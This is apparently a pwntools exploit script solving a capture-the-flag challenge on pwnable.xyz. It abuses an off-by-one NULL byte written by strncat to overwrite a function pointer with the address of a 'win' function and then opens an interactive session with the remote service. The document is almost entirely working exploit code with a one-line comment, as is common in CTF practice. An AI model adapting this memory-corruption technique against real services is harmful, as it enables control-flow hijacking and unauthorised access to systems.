###Off by one NULL in strncat

from pwn import *

###Util
def create(size,data,skill):
    r.sendlineafter('> ','1')
    r.sendlineafter('be? \n',str(size))
    r.sendafter('name: ',data)
    r.sendlineafter('> ',str(skill))

def skill():
    r.sendlineafter('> ','2')


###Addr
win = 0x400a33

###Exploit
r = remote('svc.pwnable.xyz',30032)
create(0x64,'a'*0x64,0)
create(0x64,b'a'*7+p64(win),5)
skill()
r.interactive()
